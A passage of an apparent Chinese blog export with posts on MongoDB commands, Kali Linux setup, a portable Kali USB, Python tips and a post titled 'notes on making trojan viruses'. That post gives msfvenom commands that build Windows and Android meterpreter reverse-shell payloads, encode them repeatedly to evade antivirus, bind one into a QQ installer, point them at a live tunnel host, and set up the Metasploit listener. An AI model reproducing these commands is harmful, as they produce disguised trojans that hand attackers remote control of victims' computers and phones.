<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">db.COLLECTION_NAME.insertOne( &lt;document&gt;)</span><br></pre></td></tr></table></figure>

<p><code>db.COLLECTION_NAME.insertMany()</code> 用于向集合插入一个多个文档，语法格式如下：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">db.COLLECTION_NAME.insertMany([ </span><br><span class="line">   &lt;document 1&gt; , </span><br><span class="line">   &lt;document 2&gt;,</span><br><span class="line">   ... </span><br><span class="line">])</span><br></pre></td></tr></table></figure>

<blockquote>
<p>参数说明：</p>
<p><strong>document</strong>：要写入的文档。</p>
</blockquote>
<h4 id="更新文档"><a href="#更新文档" class="headerlink" title="更新文档"></a>更新文档</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">db.collection.update(</span><br><span class="line">   &lt;query&gt;,</span><br><span class="line">   &lt;update&gt;</span><br><span class="line">)</span><br></pre></td></tr></table></figure>

<blockquote>
<p><strong>参数说明：</strong></p>
<ul>
<li><strong>query</strong> : update的查询条件，类似sql update查询内where后面的。</li>
<li><strong>update</strong> : update的对象和一些更新的操作符（如$,$inc…）等，也可以理解为sql update查询内set后面的</li>
</ul>
</blockquote>
<p><strong>例子</strong></p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="operator">/</span><span class="operator">/</span> 更新所有年龄为<span class="number">25</span>岁的John的城市修改为&quot;Chicago&quot;</span><br><span class="line">db.exampleCollection.updateMany(</span><br><span class="line">  &#123; name: &quot;John&quot;, age: <span class="number">25</span> &#125;,</span><br><span class="line">  &#123; $<span class="keyword">set</span>: &#123; city: &quot;Chicago&quot; &#125; &#125;</span><br><span class="line">)</span><br></pre></td></tr></table></figure>

<blockquote>
<p><code>$set</code>为操作符，更多操作符参考下文的<a href="#operator_anchor">文档操作符</a></p>
</blockquote>
<h4 id="删除文档"><a href="#删除文档" class="headerlink" title="删除文档"></a>删除文档</h4><p><code>db.COLLECTION_NAME.deleteOne()</code> 用于向集合删除符合条件的多个文档，语法格式如下：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">db.collection.deleteOne (&lt;query&gt;)</span><br></pre></td></tr></table></figure>

<p>db.collection.deleteOne() 用于向集合删除符合条件的多个文档，语法格式如下：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">db.collection.deleteMany (&lt;query&gt;)</span><br></pre></td></tr></table></figure>



<blockquote>
<p><strong>query</strong> :（可选）删除的文档的条件。</p>
</blockquote>
<h2 id="数据库的其他操作"><a href="#数据库的其他操作" class="headerlink" title="数据库的其他操作"></a>数据库的其他操作</h2><h3 id="文档操作符"><a href="#文档操作符" class="headerlink" title="文档操作符"></a>文档操作符</h3>]]></content>
      <categories>
        <category>微服务</category>
      </categories>
      <tags>
        <tag>mongodb</tag>
        <tag>数据库</tag>
      </tags>
  </entry>
  <entry>
    <title>SQL注入</title>
    <url>/2023/11/07/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8/SQL%E6%B3%A8%E5%85%A5/</url>
    <content><![CDATA[]]></content>
      <categories>
        <category>信息安全</category>
      </categories>
      <tags>
        <tag>kali， SQL</tag>
      </tags>
  </entry>
  <entry>
    <title>制作U盘可携带式Kali</title>
    <url>/2023/11/07/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8/%E5%88%B6%E4%BD%9CU%E7%9B%98%E5%8F%AF%E6%90%BA%E5%B8%A6%E5%BC%8FKali/</url>
    <content><![CDATA[<h1 id="制作U盘可携带式Kali"><a href="#制作U盘可携带式Kali" class="headerlink" title="制作U盘可携带式Kali"></a>制作U盘可携带式Kali</h1><h2 id="1-准备材料"><a href="#1-准备材料" class="headerlink" title="1.准备材料"></a>1.准备材料</h2><h3 id="1-1-硬件"><a href="#1-1-硬件" class="headerlink" title="1.1 硬件"></a>1.1 硬件</h3><p>1.32GB以上，USB 3.0及以上U盘一块；<br>2.电脑一台；</p>
<h3 id="1-2-软件"><a href="#1-2-软件" class="headerlink" title="1.2 软件"></a>1.2 软件</h3><p>1.<a href="https://www.balena.io/etcher/">balenaEtcher</a><br>2.<a href="https://www.disktool.cn/">分区助手</a><br>3.VMWare Workstation（已安装Kali，用于配置持久化分区）<br>4.<a href="https://www.kali.org/get-kali/#kali-live">Kali USB版镜像</a></p>
<h2 id="烧录"><a href="#烧录" class="headerlink" title="烧录"></a>烧录</h2><h2 id="启动"><a href="#启动" class="headerlink" title="启动"></a>启动</h2><h2 id="持久化"><a href="#持久化" class="headerlink" title="持久化"></a>持久化</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">fdisk -l</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mkfs.ext4 -L persistence /dev/sdb5</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mkdir -p /mnt/usb</span><br><span class="line">mount /dev/sdb5 /mnt/usb</span><br><span class="line">echo &quot;/ union&quot; &gt; /mnt/usb/persistence.conf</span><br><span class="line">umount /mnt/usb</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<h2 id="下载镜像"><a href="#下载镜像" class="headerlink" title="下载镜像"></a>下载镜像</h2><p><img src="https://s2.loli.net/2023/11/07/faCTRNw8G7iXmlq.png" alt="image-20231107145917896"></p>
<h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p>[1]: <a href="https://zhuanlan.zhihu.com/p/129348579">https://zhuanlan.zhihu.com/p/129348579</a>	“将Kali Linux部署在U盘上，并实现U盘启动（汇总纠错）”<br>[2]: <a href="https://blog.csdn.net/qq_59032809/article/details/127189546">https://blog.csdn.net/qq_59032809/article/details/127189546</a>	“如何将kali系统写入U盘，并在U盘中启动”<br>[3]: <a href="https://blog.csdn.net/BlackBtuWhite/article/details/129645845">https://blog.csdn.net/BlackBtuWhite/article/details/129645845</a>	“制作U盘可携带式KaliLinux”<br>[4]: <a href="https://blog.csdn.net/qq_25426559/article/details/130190594">https://blog.csdn.net/qq_25426559/article/details/130190594</a>	“【KALI】自制U盘版KALI（即插即用具有可持久化功能）”</p>
]]></content>
      <categories>
        <category>信息安全</category>
      </categories>
      <tags>
        <tag>kali</tag>
        <tag>U盘</tag>
      </tags>
  </entry>
  <entry>
    <title>木马病毒制作的笔记</title>
    <url>/2023/11/07/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8/%E6%9C%A8%E9%A9%AC%E7%97%85%E6%AF%92%E5%88%B6%E4%BD%9C%E7%9A%84%E7%AC%94%E8%AE%B0/</url>
    <content><![CDATA[<h1 id="木马病毒制作的笔记"><a href="#木马病毒制作的笔记" class="headerlink" title="木马病毒制作的笔记"></a>木马病毒制作的笔记</h1><h2 id="工具准备"><a href="#工具准备" class="headerlink" title="工具准备"></a>工具准备</h2><h4 id="内网-穿透工具"><a href="#内网-穿透工具" class="headerlink" title="内网 穿透工具"></a>内网 穿透工具</h4><p><a href="https://hsk.oray.com/">花生壳</a></p>
<p><a href="https://www.ngrok.cc/user.html">ngork</a></p>
<h4 id="加壳工具"><a href="#加壳工具" class="headerlink" title="加壳工具"></a>加壳工具</h4><h4 id="系统环境"><a href="#系统环境" class="headerlink" title="系统环境"></a>系统环境</h4><p>kali（发动控制的主机）</p>
<p>windows（目标主机）</p>
<h4 id="病毒制作工具"><a href="#病毒制作工具" class="headerlink" title="病毒制作工具"></a>病毒制作工具</h4><h2 id="内网穿透"><a href="#内网穿透" class="headerlink" title="内网穿透"></a>内网穿透</h2><p>我是采用<code>ngork</code>进行</p>
<p>隧道id：<code>174035416011</code></p>
<p>隧道端口:<code>10230</code></p>
<p>服务器地址:	<code>free.idcfengye.com</code></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">./sunny clientid 隧道ID</span><br></pre></td></tr></table></figure>



<h2 id="木马病毒的制作"><a href="#木马病毒的制作" class="headerlink" title="木马病毒的制作"></a>木马病毒的制作</h2><h3 id="windows病毒"><a href="#windows病毒" class="headerlink" title="windows病毒"></a>windows病毒</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">msfvenom -p windows/meterpreter/reverse_tcp LHOST=服务器地址 LPORT=隧道端口 -f exe &gt; /root/muma.exe</span><br></pre></td></tr></table></figure>

<h4 id="多次编码并捆绑qq安装包的可执行程序"><a href="#多次编码并捆绑qq安装包的可执行程序" class="headerlink" title="多次编码并捆绑qq安装包的可执行程序"></a>多次编码并捆绑qq安装包的可执行程序</h4><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">msfvenom -a x86 --platform windows -p windows/meterpreter/reverse_tcp -e x86/shikata_ga_nai -i 20 LHOST=free.idcfengye.com LPORT=10230 -f raw | msfvenom -a x86 --platform windows -e x86/alpha_upper -i 10 -f raw | msfvenom -a x86 --platform windows -e x86/countdown -i 10 -x QQ9.7.18.29256.exe -k -f exe &gt; csdn2.exe</span><br></pre></td></tr></table></figure>



<h3 id="安卓病毒"><a href="#安卓病毒" class="headerlink" title="安卓病毒"></a>安卓病毒</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"></span><br></pre></td></tr></table></figure>

<h2 id="病毒免杀"><a href="#病毒免杀" class="headerlink" title="病毒免杀"></a>病毒免杀</h2><h3 id="windows"><a href="#windows" class="headerlink" title="windows"></a>windows</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">msfvenom -a x86 -p windows/meterpreter/reverse_tcp lhost=192.168.255.130 lport=4444 -e x86/shikata_ga_nai -x QQ9.7.18.29256.exe -i 12 -f exe -o /kali/Desktop/csdn.exe</span><br></pre></td></tr></table></figure>



<h3 id="安卓病毒-1"><a href="#安卓病毒-1" class="headerlink" title="安卓病毒"></a>安卓病毒</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">msfvenom --platform Android -p android/meterpreter/reverse_tcp LHOST=服务器地址（域名） LPORT=隧道端口 -e x86/shikata_ga_nai R &gt; black_1.apk</span><br></pre></td></tr></table></figure>



<h2 id="远程控制"><a href="#远程控制" class="headerlink" title="远程控制"></a>远程控制</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">msfconsole</span><br></pre></td></tr></table></figure>



<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">use exploit/multi/handler</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">set payload windows/meterpreter/reverse_tcp</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">show options</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">set lhost 本地IP</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">set lport 本地端口</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">run</span><br></pre></td></tr></table></figure>

<h2 id="远程控制操作"><a href="#远程控制操作" class="headerlink" title="远程控制操作"></a>远程控制操作</h2><p><a href="https://uuzdaisuki.com/2020/08/04/meterpreter%E5%91%BD%E4%BB%A4%E6%80%BB%E7%BB%93/">meterpreter命令总结</a></p>
<p><a href="https://www.cnblogs.com/yokan/p/12635066.html">https://www.cnblogs.com/yokan/p/12635066.html</a></p>
<p><a href="https://spwpun.github.io/2019/12/29/meterpreter%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/">https://spwpun.github.io/2019/12/29/meterpreter%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/</a></p>
<h2 id="相关链接"><a href="#相关链接" class="headerlink" title="相关链接"></a>相关链接</h2><p>[1]: <a href="https://blog.csdn.net/NuclearDalance/article/details/116450238">https://blog.csdn.net/NuclearDalance/article/details/116450238</a>	“使用Kali Linux系统生成木马病毒并实现远程控制计算机”<br>[2]: <a href="https://xz.aliyun.com/t/12893">https://xz.aliyun.com/t/12893</a>	“Android免杀小结”<br>[3]: <a href="https://cloud.tencent.com/developer/article/2245833">https://cloud.tencent.com/developer/article/2245833</a>	“使用Kali生成木马入侵安卓手机”</p>
<p>[4]: <a href="https://bbs.kanxue.com/thread-254995.htm">https://bbs.kanxue.com/thread-254995.htm</a>	“[分享]免杀之安卓渗透”<br>[5]: <a href="https://blog.csdn.net/m0_46250064/article/details/105193234">https://blog.csdn.net/m0_46250064/article/details/105193234</a>	“让你自己制作的木马和病毒用360安全卫士杀不出。加壳，免杀，加花，捆绑，压缩。”</p>
]]></content>
      <categories>
        <category>信息安全</category>
      </categories>
      <tags>
        <tag>kali</tag>
        <tag>木马病毒</tag>
      </tags>
  </entry>
  <entry>
    <title>通过kali进行网络攻击</title>
    <url>/2023/11/07/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8/%E9%80%9A%E8%BF%87kali%E8%BF%9B%E8%A1%8C%E7%BD%91%E7%BB%9C%E6%94%BB%E5%87%BB/</url>
    <content><![CDATA[<h1 id="通过kali进行网络攻击"><a href="#通过kali进行网络攻击" class="headerlink" title="通过kali进行网络攻击"></a>通过kali进行网络攻击</h1><h2 id="相关链接"><a href="#相关链接" class="headerlink" title="相关链接"></a>相关链接</h2><p>[1]: <a href="https://blog.csdn.net/a_n_d_y_s_u_n__/article/details/118528019">https://blog.csdn.net/a_n_d_y_s_u_n__/article/details/118528019</a>	“Kali Linux三种网络攻击方法总结（DDoS、CC和ARP欺骗）”<br>[2]: <a href="https://zhuanlan.zhihu.com/p/441180960">https://zhuanlan.zhihu.com/p/441180960</a>	“我在实验室电脑上玩Kali（中间人攻击、ARP，顺便断了同学的网）”<br>[3]: </p>
]]></content>
      <categories>
        <category>信息安全</category>
      </categories>
      <tags>
        <tag>kali</tag>
        <tag>网络攻击</tag>
      </tags>
  </entry>
  <entry>
    <title>kali的配置</title>
    <url>/2023/11/07/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8/kali%E7%9A%84%E9%85%8D%E7%BD%AE/</url>
    <content><![CDATA[<h1 id="kali的配置"><a href="#kali的配置" class="headerlink" title="kali的配置"></a>kali的配置</h1><h2 id="用户配置"><a href="#用户配置" class="headerlink" title="用户配置"></a>用户配置</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo -i</span><br></pre></td></tr></table></figure>



<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo su root</span><br><span class="line">#进入root用户</span><br><span class="line">sudo passwd root</span><br><span class="line">#如果不知道密码请使用此命令修改</span><br></pre></td></tr></table></figure>



<h2 id="更换apt的镜像源"><a href="#更换apt的镜像源" class="headerlink" title="更换apt的镜像源"></a>更换apt的镜像源</h2><h4 id="编辑APT源"><a href="#编辑APT源" class="headerlink" title="编辑APT源"></a>编辑APT源</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">vim /etc/apt/sources.list</span><br></pre></td></tr></table></figure>

<h4 id="添加如下APT源地址"><a href="#添加如下APT源地址" class="headerlink" title="添加如下APT源地址"></a>添加如下APT源地址</h4><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">中科大</span></span><br><span class="line">deb http://mirrors.ustc.edu.cn/kali kali-rolling main non-free contrib</span><br><span class="line">deb-src http://mirrors.ustc.edu.cn/kali kali-rolling main non-free contrib</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">阿里云</span></span><br><span class="line">deb http://mirrors.aliyun.com/kali kali-rolling main non-free contrib</span><br><span class="line">deb-src http://mirrors.aliyun.com/kali kali-rolling main non-free contrib</span><br></pre></td></tr></table></figure>

<h4 id="更新APT"><a href="#更新APT" class="headerlink" title="更新APT"></a>更新APT</h4><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">更新APT的资源列表</span></span><br><span class="line">apt-get update</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">清除已安装软件的安装抱</span></span><br><span class="line">apt-get clean</span><br></pre></td></tr></table></figure>

<h2 id="网络配置"><a href="#网络配置" class="headerlink" title="网络配置"></a>网络配置</h2><h4 id="编辑配置文件"><a href="#编辑配置文件" class="headerlink" title="编辑配置文件"></a>编辑配置文件</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">vim /etc/network/interfaces</span><br></pre></td></tr></table></figure>

<p><strong>如果是虚拟机启动，需要将网络连接方式设置为桥接方式</strong></p>
<h4 id="修改内容"><a href="#修改内容" class="headerlink" title="修改内容"></a>修改内容</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">auto eth0 </span><br><span class="line">iface eth0 inet static </span><br><span class="line">address 192.168.136.199（IP地址）</span><br><span class="line">netmask 255.255.255.0 （子网掩码）</span><br><span class="line">gateway 192.168.136.254（网关）</span><br></pre></td></tr></table></figure>

<h4 id="设置DNS"><a href="#设置DNS" class="headerlink" title="设置DNS"></a>设置DNS</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">vi /etc/resolv.conf</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nameserver 8.8.8.8 </span><br></pre></td></tr></table></figure>

<h4 id="重启网络生效"><a href="#重启网络生效" class="headerlink" title="重启网络生效"></a>重启网络生效</h4><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">service networking restart</span><br></pre></td></tr></table></figure>

<h4 id="测试成功"><a href="#测试成功" class="headerlink" title="测试成功"></a>测试成功</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ping baidu.com</span><br><span class="line">ifconfig</span><br></pre></td></tr></table></figure>

<h2 id="SSH登入"><a href="#SSH登入" class="headerlink" title="SSH登入"></a>SSH登入</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">vim /etc/ssh/sshd_config</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#PermitRootLogin prohibit-password 取消注释并prohibit-password改为yes</span><br><span class="line"> </span><br><span class="line">#PubkeyAuthentication yes 取消注释</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">systemctl restart ssh</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">update-rc.d ssh enable</span><br></pre></td></tr></table></figure>



<h2 id="kali汉化"><a href="#kali汉化" class="headerlink" title="kali汉化"></a>kali汉化</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">dpkg-reconfigure locales</span><br></pre></td></tr></table></figure>

<p><strong>选中en_US.UTF-8 UTF-8和zh_CN.UTF-8 UTF-8(注意:按下空格键选中,选好后按下TAB键退出编码格式选项,跳到OK选项)</strong></p>
<p>在终端键入<code>reboot</code>, 重启Kali</p>
<h2 id="下载中文输入法"><a href="#下载中文输入法" class="headerlink" title="下载中文输入法"></a>下载中文输入法</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">apt install fcitx -y</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">apt-get install fcitx-googlepinyin -y</span><br></pre></td></tr></table></figure>

<p><strong>重启</strong></p>
<p>重启后可以看到右上角多了一个小键盘的图标，点击后选择“配置”。</p>
<p>在弹出的页面内可以看到多出了“Google拼音”汉语输入法。</p>
<p>如果没有，则只需要点击左下角的“+”，然后搜索“google”，然后添加即可。</p>
<h2 id="配置vpn"><a href="#配置vpn" class="headerlink" title="配置vpn"></a>配置vpn</h2><p><a href="https://blog.iswiftai.com/posts/clash-linux/">在 Linux 中使用 Clash</a></p>
<h2 id="相关链接"><a href="#相关链接" class="headerlink" title="相关链接"></a>相关链接</h2><p>[1]: <a href="https://blog.csdn.net/weixin_44971640/article/details/127387950">https://blog.csdn.net/weixin_44971640/article/details/127387950</a>	“Kali Linux基础配置 超详细图解”</p>
<p>[2]: <a href="https://blog.csdn.net/weixin_62808713/article/details/130373096">https://blog.csdn.net/weixin_62808713/article/details/130373096</a>	“Kali 安装中文输入法（超详细）”</p>
<p>[3]: <a href="https://blog.iswiftai.com/posts/clash-linux/">https://blog.iswiftai.com/posts/clash-linux/</a>	“在 Linux 中使用 Clash”</p>
]]></content>
      <categories>
        <category>信息安全</category>
      </categories>
      <tags>
        <tag>kali</tag>
      </tags>
  </entry>
  <entry>
    <title>Python小技巧</title>
    <url>/2023/11/07/%E6%8A%80%E6%9C%AF%E5%8D%9A%E5%AE%A2/Python%E5%B0%8F%E6%8A%80%E5%B7%A7/</url>
    <content><![CDATA[<h3 id="给程序加上进度条"><a href="#给程序加上进度条" class="headerlink" title="给程序加上进度条"></a>给程序加上进度条</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> tqdm <span class="keyword">import</span> tqdm,trange</span><br><span class="line"><span class="keyword">import</span>  time</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> trange(<span class="number">100</span>, colour=<span class="string">&quot;green&quot;</span>, desc=<span class="string">&quot;testing&quot;</span>):</span><br><span class="line">    time.sleep(<span class="number">0.1</span>)</span><br></pre></td></tr></table></figure>

<h3 id="当函数还未实现的时候进行报错"><a href="#当函数还未实现的时候进行报错" class="headerlink" title="当函数还未实现的时候进行报错"></a>当函数还未实现的时候进行报错</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">func1</span>():</span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">func2</span>():</span><br><span class="line">    ...</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">func3</span>():</span><br><span class="line">    <span class="keyword">raise</span> NotImplementedError(<span class="string">&quot;还未实现&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">func3()</span><br></pre></td></tr></table></figure>



<h3 id="交换两个数"><a href="#交换两个数" class="headerlink" title="交换两个数"></a>交换两个数</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">a = <span class="number">1</span></span><br><span class="line">b = <span class="number">2</span></span><br><span class="line"></span><br><span class="line">a, b = b, a</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;a:<span class="subst">&#123;a&#125;</span>, b:<span class="subst">&#123;b&#125;</span>&quot;</span>)</span><br></pre></td></tr></table></figure>

<h3 id="yield操作"><a href="#yield操作" class="headerlink" title="yield操作"></a>yield操作</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">fibonacci</span>(<span class="params">n</span>):</span><br><span class="line">    a, b= <span class="number">0</span>, <span class="number">1</span></span><br><span class="line">    <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(n):</span><br><span class="line">        <span class="keyword">yield</span> a</span><br><span class="line">        a, b = b, a + b</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> fibonacci(<span class="number">10</span>):</span><br><span class="line">    <span class="built_in">print</span>(i)</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h3 id="函数多值返回"><a href="#函数多值返回" class="headerlink" title="函数多值返回"></a>函数多值返回</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">user_info</span>():</span><br><span class="line">    name = <span class="string">&#x27;Abhay&#x27;</span></span><br><span class="line">    age = <span class="number">26</span></span><br><span class="line">    address = <span class="string">&#x27;Bangalore&#x27;</span></span><br><span class="line">    <span class="keyword">return</span> name, age, address</span><br><span class="line"></span><br><span class="line">Name , Age , Address = user_info()</span><br><span class="line"><span class="built_in">print</span>(Name, Age, Address) </span><br></pre></td></tr></table></figure>

<h3 id="格式化大数字"><a href="#格式化大数字" class="headerlink" title="格式化大数字"></a>格式化大数字</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">num = <span class="number">24_5645_6987</span></span><br><span class="line">num2 = <span class="number">3_456_986_784</span> <span class="comment"># 魔幻的写法，魔幻的世界</span></span><br><span class="line"><span class="built_in">sum</span> = num + num2</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;<span class="subst">&#123;<span class="built_in">sum</span>:,&#125;</span>&quot;</span>) <span class="comment"># 5,913,443,771</span></span><br></pre></td></tr></table></figure>



<h3 id="文件操作"><a href="#文件操作" class="headerlink" title="文件操作"></a>文件操作</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;a.txt&quot;</span>, <span class="string">&quot;r&quot;</span>, encoding=<span class="string">&quot;utf-8&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    <span class="built_in">print</span>(f.read())</span><br></pre></td></tr></table></figure>

<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">finally</span>:</span><br><span class="line">    <span class="keyword">if</span> f:</span><br><span class="line">        f.close()</span><br></pre></td></tr></table></figure>

<p>这个with语句和前面的try … finally结构是一样的，但是代码更佳简洁，并且不必调用<code>f.close()</code>方法。</p>
<h3 id="内联条件"><a href="#内联条件" class="headerlink" title="内联条件"></a>内联条件</h3><p>根据特定条件去执行任务时：如果只有一条执行语句，则可以在一行中完成，这样更容易阅读。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">x =<span class="number">5</span></span><br><span class="line"><span class="keyword">if</span> x==<span class="number">5</span>: <span class="built_in">print</span>(<span class="string">&quot;x equals 5&quot;</span>)  <span class="comment"># 一行代码</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(x+<span class="number">5</span>): <span class="built_in">print</span>(i) <span class="comment"># 一行代码</span></span><br></pre></td></tr></table></figure>

<p><strong>三元运算</strong></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">condition = <span class="literal">True</span></span><br><span class="line">x = <span class="number">5</span> <span class="keyword">if</span> condition <span class="keyword">else</span> <span class="number">10</span> <span class="comment"># one line do it</span></span><br></pre></td></tr></table></figure>

<h3 id="列表推导式"><a href="#列表推导式" class="headerlink" title="列表推导式"></a>列表推导式</h3><p>与其创建一个空列表，然后在列表中添加元素，不如使用<strong>列表推导式</strong>来创建一个空列表并同时将元素添加到列表中。</p>
<p>语法：<code>new_list = [expression for item in iterable (if conditional)]</code></p>
<p>例如：求偶数的平方</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">squares = [i*i <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10</span>) <span class="keyword">if</span> i%<span class="number">2</span>==<span class="number">0</span>]</span><br><span class="line"><span class="built_in">print</span>(squares) <span class="comment"># [0, 4, 16, 36, 64]</span></span><br></pre></td></tr></table></figure>

<h3 id="enumerate枚举迭代"><a href="#enumerate枚举迭代" class="headerlink" title="enumerate枚举迭代"></a>enumerate枚举迭代</h3><p>数一数 Python 的最佳特性，那么枚举enumerate一定是名列前茅的。 它与循环相似，不同的是，同时提供循环对象和索引值。</p>
<p>语法：<code>for index,value in enumerate(iterable): print(index,value)</code></p>
<p>通过一个例子来更好地理解它，我们需要将列表中所有值为偶数的位置替换为Even，将所有值为奇数的位置替换为Odd：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">lst = [<span class="number">13</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">90</span>]</span><br><span class="line"><span class="keyword">for</span> index,value <span class="keyword">in</span> <span class="built_in">enumerate</span>(lst):</span><br><span class="line">    <span class="keyword">if</span> value%<span class="number">2</span>==<span class="number">0</span>:</span><br><span class="line">        lst[index] = <span class="string">&quot;Even&quot;</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        lst[index] = <span class="string">&quot;Odd&quot;</span></span><br><span class="line"><span class="built_in">print</span>(lst) <span class="comment"># [&#x27;Odd&#x27;, &#x27;Even&#x27;, &#x27;Odd&#x27;, &#x27;Even&#x27;, &#x27;Even&#x27;]</span></span><br></pre></td></tr></table></figure>

<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">lst = [<span class="number">13</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">90</span>]</span><br><span class="line">lst = [<span class="string">&#x27;Even&#x27;</span> <span class="keyword">if</span> value %<span class="number">2</span> == <span class="number">0</span> <span class="keyword">else</span> <span class="string">&#x27;Odd&#x27;</span> <span class="keyword">for</span> index,value <span class="keyword">in</span> <span class="built_in">enumerate</span>(lst) ]</span><br><span class="line"><span class="built_in">print</span>(lst) <span class="comment"># [&#x27;Odd&#x27;, &#x27;Even&#x27;, &#x27;Odd&#x27;, &#x27;Even&#x27;, &#x27;Even&#x27;]</span></span><br></pre></td></tr></table></figure>

<h3 id="将列表中的所有元素作为参数传递给函数"><a href="#将列表中的所有元素作为参数传递给函数" class="headerlink" title="将列表中的所有元素作为参数传递给函数"></a>将列表中的所有元素作为参数传递给函数</h3><p>我们可以使用 * 号，提取列表中所有的元素</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">def sum_of_elements(*arg):</span><br><span class="line">    total = 0</span><br><span class="line">    for i in arg:</span><br><span class="line">        total += i</span><br><span class="line"></span><br><span class="line">    return total</span><br><span class="line"></span><br><span class="line">result = sum_of_elements(*[1, 2, 3, 4])</span><br><span class="line">print(result)  # 10</span><br></pre></td></tr></table></figure>

